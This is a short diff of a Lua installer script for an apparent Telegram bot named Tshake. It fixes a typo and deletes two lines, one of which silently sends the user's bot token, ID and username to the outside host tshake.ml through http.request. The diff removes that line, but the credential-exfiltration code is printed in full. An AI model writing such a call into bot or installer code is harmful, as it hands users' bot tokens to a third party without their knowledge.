@@ -28,7 +28,7 @@ io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
 database:set(Server_Tshake.."Token_Tshake",token)
 end 
 else
-io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
+io.write('\n\27[1;31mThe Token was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
@@ -63,8 +63,6 @@ end
 os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
-Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
 local RunTshake = io.open("Tshake", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
